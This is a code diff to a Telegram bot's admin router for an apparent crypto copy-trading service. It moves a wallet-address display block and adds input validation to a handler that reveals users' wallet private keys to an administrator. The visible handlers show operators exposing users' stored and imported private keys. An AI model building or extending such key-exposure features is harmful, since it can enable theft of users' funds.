@@ -364,13 +364,36 @@ def build_admin_router(settings: Settings) -> Router:
         setting = await session.scalar(
             select(CopytradeSetting).where(CopytradeSetting.user_id == user_id)
         )
+        address = setting.wallet_address if setting and setting.wallet_address else "Not provided"
+        await _edit(
+            callback,
+            "📍 <b>PASTED ADDRESS</b>\n\n"
+            f"User: {_username(user)}\n"
+            f"<code>{html.escape(address)}</code>",
+            user_detail_keyboard(user.id, user.is_active),
+        )
 
     @router.callback_query(F.data.startswith("admin:user_wallet_key:"))
     async def reveal_user_wallet_key(
         callback: CallbackQuery, session: AsyncSession
     ) -> None:
-        _, _, _, user_id_text, chain = callback.data.split(":")
-        user = await UserRepository(session).get_by_id(int(user_id_text))
+        # Callback data is ``admin:user_wallet_key:<user_id>:<chain>``.
+        # Keep parsing bounded so malformed/legacy callbacks do not crash the
+        # dispatcher with an unpacking error.
+        parts = callback.data.split(":")
+        if len(parts) != 4 or parts[:2] != ["admin", "user_wallet_key"]:
+            await callback.answer("Invalid wallet request.", show_alert=True)
+            return
+        _, _, user_id_text, chain = parts
+        if chain not in APPROVED_CHAINS:
+            await callback.answer("Unsupported wallet chain.", show_alert=True)
+            return
+        try:
+            user_id = int(user_id_text)
+        except ValueError:
+            await callback.answer("Invalid user.", show_alert=True)
+            return
+        user = await UserRepository(session).get_by_id(user_id)
         if user is None:
             await callback.answer("User not found.", show_alert=True)
             return
@@ -392,14 +415,6 @@ def build_admin_router(settings: Settings) -> Router:
                 parse_mode="HTML",
             )
         await callback.answer(f"{asset} key revealed.")
-        address = setting.wallet_address if setting and setting.wallet_address else "Not provided"
-        await _edit(
-            callback,
-            "📍 <b>PASTED ADDRESS</b>\n\n"
-            f"User: {_username(user)}\n"
-            f"<code>{html.escape(address)}</code>",
-            user_detail_keyboard(user.id, user.is_active),
-        )
 
     @router.callback_query(F.data.startswith("admin:imported_pk:"))
     async def reveal_imported_pk(callback: CallbackQuery, session: AsyncSession) -> None:
